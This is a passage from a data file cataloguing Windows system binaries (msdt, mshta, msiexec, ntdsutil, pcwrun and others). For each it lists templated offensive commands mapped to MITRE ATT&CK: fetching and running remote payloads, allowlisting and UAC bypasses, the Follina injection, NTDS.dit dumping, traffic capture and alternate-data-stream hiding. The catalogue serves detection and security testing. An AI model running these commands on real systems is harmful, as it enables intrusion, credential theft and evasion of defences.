    commands: [{"cmd": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE", "desc": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.", "usecase": "Execute code", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE", "desc": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.", "usecase": "Execute code bypass Application whitelisting", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"", "desc": "Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.", "usecase": "Execute code bypass Application allowlisting", "category": "AWL Bypass", "mitre": "T1202", "privileges": "User"}]
  },
  "msedge": {
    name: "Msedge.exe",
    description: "Microsoft Edge browser",
    path: ["c:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe", "c:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"],
    commands: [{"cmd": "msedge.exe {REMOTEURL:.exe.txt}", "desc": "Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.", "usecase": "Download file from the internet", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}", "desc": "Edge will silently download the file. File extension should be .html and binaries should be encoded.", "usecase": "Download file from the internet", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "desc": "Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command", "usecase": "Executes a process under a trusted Microsoft signed binary", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}]
  },
  "msedge_proxy": {
    name: "msedge_proxy.exe",
    description: "Microsoft Edge Browser",
    path: ["C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe"],
    commands: [{"cmd": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}", "desc": "msedge_proxy will download malicious file.", "usecase": "Download file from the internet", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "desc": "msedge_proxy.exe will execute file in the background", "usecase": "Executes a process under a trusted Microsoft signed binary", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}]
  },
  "msedgewebview2": {
    name: "msedgewebview2.exe",
    description: "msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.",
    path: ["C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\114.0.1823.43\\msedgewebview2.exe", "C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\131.0.2903.70\\msedgewebview2.exe"],
    commands: [{"cmd": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"", "desc": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified executable as its subprocess.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1218.015", "privileges": "Low privileges"}, {"cmd": "msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\"", "desc": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}, {"cmd": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\"", "desc": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}, {"cmd": "msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=\"{CMD}\"", "desc": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1218.015", "privileges": "User"}]
  },
  "mshta": {
    name: "Mshta.exe",
    description: "Used by Windows to execute html applications. (.hta)",
    path: ["C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\SysWOW64\\mshta.exe"],
    commands: [{"cmd": "mshta.exe {PATH:.hta}", "desc": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.", "usecase": "Execute code", "category": "Execute", "mitre": "T1218.005", "privileges": "User"}, {"cmd": "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:{REMOTEURL:.sct}\"\")\"))", "desc": "Executes VBScript supplied as a command line argument.", "usecase": "Execute code", "category": "Execute", "mitre": "T1218.005", "privileges": "User"}, {"cmd": "mshta.exe javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();", "desc": "Executes JavaScript supplied as a command line argument.", "usecase": "Execute code", "category": "Execute", "mitre": "T1218.005", "privileges": "User"}, {"cmd": "mshta.exe \"{PATH_ABSOLUTE}:file.hta\"", "desc": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.", "usecase": "Execute code hidden in alternate data stream", "category": "ADS", "mitre": "T1218.005", "privileges": "User"}, {"cmd": "mshta.exe {REMOTEURL}", "desc": "It will download a remote payload and place it in INetCache.", "usecase": "Downloads payload from remote server", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "msiexec": {
    name: "Msiexec.exe",
    description: "Used by Windows to execute msi files",
    path: ["C:\\Windows\\System32\\msiexec.exe", "C:\\Windows\\SysWOW64\\msiexec.exe"],
    commands: [{"cmd": "msiexec /quiet /i {PATH:.msi}", "desc": "Installs the target .MSI file silently.", "usecase": "Execute custom made msi file with attack code", "category": "Execute", "mitre": "T1218.007", "privileges": "User"}, {"cmd": "msiexec /q /i {REMOTEURL}", "desc": "Installs the target remote & renamed .MSI file silently.", "usecase": "Execute custom made msi file with attack code from remote server", "category": "Execute", "mitre": "T1218.007", "privileges": "User"}, {"cmd": "msiexec /y {PATH_ABSOLUTE:.dll}", "desc": "Calls DllRegisterServer to register the target DLL.", "usecase": "Execute dll files", "category": "Execute", "mitre": "T1218.007", "privileges": "User"}, {"cmd": "msiexec /z {PATH_ABSOLUTE:.dll}", "desc": "Calls DllUnregisterServer to un-register the target DLL.", "usecase": "Execute dll files", "category": "Execute", "mitre": "T1218.007", "privileges": "User"}, {"cmd": "msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb", "desc": "Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.", "usecase": "Install trusted and signed msi file, with additional attack code as transformation file, from a remote server", "category": "Execute", "mitre": "T1218.007", "privileges": "User"}]
  },
  "msohtmed": {
    name: "MsoHtmEd.exe",
    description: "Microsoft Office component",
    path: ["C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSOHTMED.exe", "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\MSOHTMED.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\MSOHTMED.exe", "C:\\Program Files\\Microsoft Office\\Office16\\MSOHTMED.exe", "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\MSOHTMED.exe", "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\MSOHTMED.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\MSOHTMED.exe", "C:\\Program Files\\Microsoft Office\\Office15\\MSOHTMED.exe", "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\MSOHTMED.exe", "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\MSOHTMED.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office14\\MSOHTMED.exe", "C:\\Program Files\\Microsoft Office\\Office14\\MSOHTMED.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office12\\MSOHTMED.exe", "C:\\Program Files\\Microsoft Office\\Office12\\MSOHTMED.exe", "C:\\Program Files\\Microsoft Office\\Office12\\MSOHTMED.exe"],
    commands: [{"cmd": "MsoHtmEd.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "mspub": {
    name: "Mspub.exe",
    description: "Microsoft Publisher",
    path: ["C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSPUB.exe", "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\MSPUB.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\MSPUB.exe", "C:\\Program Files\\Microsoft Office\\Office16\\MSPUB.exe", "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\MSPUB.exe", "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\MSPUB.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\MSPUB.exe", "C:\\Program Files\\Microsoft Office\\Office15\\MSPUB.exe", "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\MSPUB.exe", "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\MSPUB.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office14\\MSPUB.exe", "C:\\Program Files\\Microsoft Office\\Office14\\MSPUB.exe"],
    commands: [{"cmd": "mspub.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "msxsl": {
    name: "msxsl.exe",
    description: "Command line utility used to perform XSL transformations.",
    path: ["no default"],
    commands: [{"cmd": "msxsl.exe {PATH:.xml} {PATH:.xsl}", "desc": "Run COM Scriptlet code within the script.xsl file (local).", "usecase": "Local execution of script stored in XSL file.", "category": "Execute", "mitre": "T1220", "privileges": "User"}, {"cmd": "msxsl.exe {PATH:.xml} {PATH:.xsl}", "desc": "Run COM Scriptlet code within the script.xsl file (local).", "usecase": "Local execution of script stored in XSL file.", "category": "AWL Bypass", "mitre": "T1220", "privileges": "User"}, {"cmd": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}", "desc": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).", "usecase": "Local execution of remote script stored in XSL script stored as an XML file.", "category": "Execute", "mitre": "T1220", "privileges": "User"}, {"cmd": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}", "desc": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).", "usecase": "Local execution of remote script stored in XSL script stored as an XML file.", "category": "AWL Bypass", "mitre": "T1220", "privileges": "User"}, {"cmd": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}", "desc": "Using remote XML and XSL files, save the transformed XML file to disk.", "usecase": "Download a file from the internet and save it to disk.", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name", "desc": "Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).", "usecase": "Download a file from the internet and save it to an NTFS Alternate Data Stream.", "category": "ADS", "mitre": "T1564", "privileges": "User"}]
  },
  "netsh": {
    name: "Netsh.exe",
    description: "Netsh is a Windows tool used to manipulate network interface settings.",
    path: ["C:\\WINDOWS\\System32\\Netsh.exe", "C:\\WINDOWS\\SysWOW64\\Netsh.exe"],
    commands: [{"cmd": "netsh.exe add helper {PATH_ABSOLUTE:.dll}", "desc": "Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called", "usecase": "Proxy execution of .dll", "category": "Execute", "mitre": "T1546.007", "privileges": "Admin"}]
  },
  "ngen": {
    name: "Ngen.exe",
    description: "Microsoft Native Image Generator.",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ngen.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ngen.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe"],
    commands: [{"cmd": "ngen.exe {REMOTEURL}", "desc": "Downloads payload from remote server using the Microsoft Native Image Generator utility.", "usecase": "It will download a remote payload and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "nmcap": {
    name: "Nmcap.exe",
    description: "Command-line packet capture utility from Microsoft Network Monitor 3.x.",
    path: ["C:\\Program Files\\Microsoft Network Monitor 3\\nmcap.exe", "C:\\Program Files (x86)\\Microsoft Network Monitor 3\\nmcap.exe"],
    commands: [{"cmd": "nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap}", "desc": "Start capture on all network adapters and save to specified .cap (circular) file.\nOptionally, one can add:\n- `/TerminateWhen /TimeAfter 30 seconds` to auto-terminate after a relative times (e.g. 30 seconds);\n- `/TerminateWhen /Time 04:52:00 AM 9/17/2025` to auto-terminate after a specific date/time;\n- `/TerminateWhen /KeyPress x` to terminate when a specific key is pressed.", "usecase": "Capture network traffic on windows to collect sensitive data.", "category": "Reconnaissance", "mitre": "T1040", "privileges": "Administrator"}]
  },
  "ntdsutil": {
    name: "ntdsutil.exe",
    description: "Command line utility used to export Active Directory.",
    path: ["C:\\Windows\\System32\\ntdsutil.exe"],
    commands: [{"cmd": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q", "desc": "Dump NTDS.dit into folder", "usecase": "Dumping of Active Directory NTDS.dit database", "category": "Dump", "mitre": "T1003.003", "privileges": "Administrator"}]
  },
  "ntsd": {
    name: "Ntsd.exe",
    description: "Symbolic Debugger for Windows.",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\ntsd.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\ntsd.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\arm\\ntsd.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\arm64\\ntsd.exe"],
    commands: [{"cmd": "ntsd.exe -g {CMD}", "desc": "Launches command through the debugging process; optionally add `-G` to exit the debugger automatically.", "usecase": "Executes an executable under a trusted microsoft signed binary.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "odbcad32": {
    name: "odbcad32.exe",
    description: "ODBC Data Source Administrator to manage User/System DSNs and ODBC drivers.",
    path: ["c:\\windows\\system32\\odbcad32.exe", "c:\\windows\\syswow64\\odbcad32.exe"],
    commands: [{"cmd": "odbcad32.exe", "desc": "Launch odbcad32.exe GUI, click 'Tracing' tab, click 'Browsing' button, enter abitrary command in the File Dialog's path, press enter.", "usecase": "Execute a binary as a high-integrity process without a UAC prompt.", "category": "UAC Bypass", "mitre": "T1548.002", "privileges": "User"}]
  },
  "odbcconf": {
    name: "Odbcconf.exe",
    description: "Used in Windows for managing ODBC connections",
    path: ["C:\\Windows\\System32\\odbcconf.exe", "C:\\Windows\\SysWOW64\\odbcconf.exe"],
    commands: [{"cmd": "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}", "desc": "Execute DllRegisterServer from DLL specified.", "usecase": "Execute a DLL file using technique that can evade defensive counter measures", "category": "Execute", "mitre": "T1218.008", "privileges": "User"}, {"cmd": "odbcconf INSTALLDRIVER \"lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2\"\nodbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"", "desc": "Install a driver and load the DLL. Requires administrator privileges.", "usecase": "Execute dll file using technique that can evade defensive counter measures", "category": "Execute", "mitre": "T1218.008", "privileges": "User"}, {"cmd": "odbcconf -f {PATH:.rsp}", "desc": "Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.", "usecase": "Execute dll file using technique that can evade defensive counter measures", "category": "Execute", "mitre": "T1218.008", "privileges": "Administrator"}]
  },
  "offlinescannershell": {
    name: "OfflineScannerShell.exe",
    description: "Windows Defender Offline Shell",
    path: ["C:\\Program Files\\Windows Defender\\Offline\\OfflineScannerShell.exe"],
    commands: [{"cmd": "OfflineScannerShell", "desc": "Execute mpclient.dll library in the current working directory", "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "category": "Execute", "mitre": "T1218", "privileges": "Administrator"}]
  },
  "onedrivestandaloneupdater": {
    name: "OneDriveStandaloneUpdater.exe",
    description: "OneDrive Standalone Updater",
    path: ["C:\\Users\\<username>\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", "C:\\Program Files\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe", "C:\\Program Files (x86)\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe"],
    commands: [{"cmd": "OneDriveStandaloneUpdater", "desc": "Download a file from the web address specified in `HKCU\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC`. `ODSUUpdateXMLUrlFromOC` and `UpdateXMLUrlFromOC` must be equal to non-empty string values in that same registry key. `UpdateOfficeConfigTimestamp` is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in `%localappdata%\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json`.", "usecase": "Download a file from the Internet without executing any anomalous executables with suspicious arguments", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "openconsole": {
    name: "OpenConsole.exe",
    description: "Console Window host for Windows Terminal",
    path: ["C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\Terminal\\ServiceHub\\os64\\OpenConsole.exe", "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\Terminal\\ServiceHub\\os86\\OpenConsole.exe", "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\Terminal\\ServiceHub\\os64\\OpenConsole.exe", "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\\OpenConsole.exe"],
    commands: [{"cmd": "OpenConsole.exe {PATH:.exe}", "desc": "Execute specified process with OpenConsole.exe as parent process", "usecase": "Use OpenConsole.exe as a proxy binary to evade defensive counter-measures", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "pcalua": {
    name: "Pcalua.exe",
    description: "Program Compatibility Assistant",
    path: ["C:\\Windows\\System32\\pcalua.exe"],
    commands: [{"cmd": "pcalua.exe -a {PATH:.exe}", "desc": "Open the target .EXE using the Program Compatibility Assistant.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "pcalua.exe -a {PATH_SMB:.dll}", "desc": "Open the target .DLL file with the Program Compatibilty Assistant.", "usecase": "Proxy execution of remote dll file", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java", "desc": "Open the target .CPL file with the Program Compatibility Assistant.", "usecase": "Execution of CPL files", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "pcwrun": {
    name: "Pcwrun.exe",
    description: "Program Compatibility Wizard",
    path: ["C:\\Windows\\System32\\pcwrun.exe"],
    commands: [{"cmd": "Pcwrun.exe {PATH_ABSOLUTE:.exe}", "desc": "Open the target .EXE file with the Program Compatibility Wizard.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "Pcwrun.exe /../../$(calc).exe", "desc": "Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "pester": {
    name: "Pester.bat",
    description: "Used as part of the Powershell pester",
    path: ["c:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\<VERSION>\\bin\\Pester.bat"],
    commands: [{"cmd": "Pester.bat [/help|?|-?|/?] \"$null; {CMD}\"", "desc": "Execute code using Pester. The third parameter can be anything. The fourth is the payload.", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216", "privileges": "User"}, {"cmd": "Pester.bat ;{PATH:.exe}", "desc": "Execute code using Pester. Example here executes specified executable.", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216", "privileges": "User"}]
  },
  "pixtool": {
    name: "Pixtool.exe",
    description: "Command line utility for taking and analyzing PIX GPU captures.",
    path: ["C:\\Program Files\\Microsoft PIX\\pixtool.exe", "C:\\Program Files (x86)\\Microsoft PIX\\pixtool.exe"],
    commands: [{"cmd": "pixtool.exe launch {PATH_ABSOLUTE:.exe}", "desc": "Launches an executable via PIX command-line utility.", "usecase": "Executes an executable under a trusted, Microsoft signed binary.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "pktmon": {
    name: "Pktmon.exe",
    description: "Capture Network Packets on the windows 10 with October 2018 Update or later.",
    path: ["c:\\windows\\system32\\pktmon.exe", "c:\\windows\\syswow64\\pktmon.exe"],
    commands: [{"cmd": "pktmon.exe start --etw", "desc": "Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop", "usecase": "use this a built in network sniffer on windows 10 to capture senstive traffic", "category": "Reconnaissance", "mitre": "T1040", "privileges": "Administrator"}, {"cmd": "pktmon.exe filter add -p 445", "desc": "Select Desired ports for packet capture", "usecase": "Look for interesting traffic such as telent or FTP", "category": "Reconnaissance", "mitre": "T1040", "privileges": "Administrator"}]
  },
  "pnputil": {
    name: "Pnputil.exe",
    description: "Used for installing drivers",
    path: ["C:\\Windows\\system32\\pnputil.exe"],
    commands: [{"cmd": "pnputil.exe -i -a {PATH_ABSOLUTE:.inf}", "desc": "Used for installing drivers", "usecase": "Add malicious driver", "category": "Execute", "mitre": "T1547", "privileges": "Administrator"}]
  },
  "powerpnt": {
    name: "Powerpnt.exe",
    description: "Microsoft Office binary.",
    path: ["C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Powerpnt.exe", "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Powerpnt.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\Powerpnt.exe", "C:\\Program Files\\Microsoft Office\\Office16\\Powerpnt.exe", "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Powerpnt.exe", "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Powerpnt.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\Powerpnt.exe", "C:\\Program Files\\Microsoft Office\\Office15\\Powerpnt.exe", "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\Powerpnt.exe", "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\Powerpnt.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office14\\Powerpnt.exe", "C:\\Program Files\\Microsoft Office\\Office14\\Powerpnt.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office12\\Powerpnt.exe", "C:\\Program Files\\Microsoft Office\\Office12\\Powerpnt.exe", "C:\\Program Files\\Microsoft Office\\Office12\\Powerpnt.exe"],
    commands: [{"cmd": "Powerpnt.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "presentationhost": {
    name: "Presentationhost.exe",
    description: "File is used for executing Browser applications",
    path: ["C:\\Windows\\System32\\Presentationhost.exe", "C:\\Windows\\SysWOW64\\Presentationhost.exe"],
    commands: [{"cmd": "Presentationhost.exe {PATH_ABSOLUTE:.xbap}", "desc": "Executes the target XAML Browser Application (XBAP) file", "usecase": "Execute code within XBAP files", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "Presentationhost.exe {REMOTEURL}", "desc": "It will download a remote payload and place it in INetCache.", "usecase": "Downloads payload from remote server", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "print": {
    name: "Print.exe",
    description: "Used by Windows to send files to the printer",
    path: ["C:\\Windows\\System32\\print.exe", "C:\\Windows\\SysWOW64\\print.exe"],
    commands: [{"cmd": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}", "desc": "Copy file.exe into the Alternate Data Stream (ADS) of file.txt.", "usecase": "Hide binary file in alternate data stream to potentially bypass defensive counter measures", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}", "desc": "Copy file from source to destination", "usecase": "Copy files", "category": "Copy", "mitre": "T1105", "privileges": "User"}, {"cmd": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}", "desc": "Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe.", "usecase": "Copy/Download file from remote server", "category": "Copy", "mitre": "T1105", "privileges": "User"}]
  },
  "printbrm": {
    name: "PrintBrm.exe",
    description: "Printer Migration Command-Line Tool",
    path: ["C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe"],
    commands: [{"cmd": "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}", "desc": "Create a ZIP file from a folder in a remote drive", "usecase": "Exfiltrate the contents of a remote folder on a UNC share into a zip file", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}", "desc": "Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder", "usecase": "Decompress and extract a ZIP file stored on an alternate data stream to a new folder", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "procdump": {
    name: "Procdump.exe",
    description: "SysInternals Memory Dump Tool",
    path: ["no default"],
    commands: [{"cmd": "procdump.exe -md {PATH:.dll} explorer.exe", "desc": "Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.", "usecase": "Performs execution of unsigned DLL.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "procdump.exe -md {PATH:.dll} foobar", "desc": "Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary.", "usecase": "Performs execution of unsigned DLL.", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "protocolhandler": {
    name: "ProtocolHandler.exe",
    description: "Microsoft Office binary",
    path: ["C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\ProtocolHandler.exe", "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\ProtocolHandler.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\ProtocolHandler.exe", "C:\\Program Files\\Microsoft Office\\Office16\\ProtocolHandler.exe", "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\ProtocolHandler.exe", "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\ProtocolHandler.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\ProtocolHandler.exe", "C:\\Program Files\\Microsoft Office\\Office15\\ProtocolHandler.exe"],
    commands: [{"cmd": "ProtocolHandler.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "provlaunch": {
    name: "Provlaunch.exe",
    description: "Launcher process",
    path: ["c:\\windows\\system32\\provlaunch.exe"],
    commands: [{"cmd": "provlaunch.exe LOLBin", "desc": "Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution.", "usecase": "Executes arbitrary command", "category": "Execute", "mitre": "T1218", "privileges": "Administrator"}]
  },
  "psr": {
    name: "Psr.exe",
    description: "Windows Problem Steps Recorder, used to record screen and clicks.",
    path: ["c:\\windows\\system32\\psr.exe", "c:\\windows\\syswow64\\psr.exe"],
    commands: [{"cmd": "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0", "desc": "Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file.", "usecase": "Can be used to take screenshots of the user environment", "category": "Reconnaissance", "mitre": "T1113", "privileges": "User"}]
  },
  "pubprn": {
    name: "Pubprn.vbs",
    description: "Proxy execution with Pubprn.vbs",
    path: ["C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs", "C:\\Windows\\SysWOW64\\Printing_Admin_Scripts\\en-US\\pubprn.vbs"],
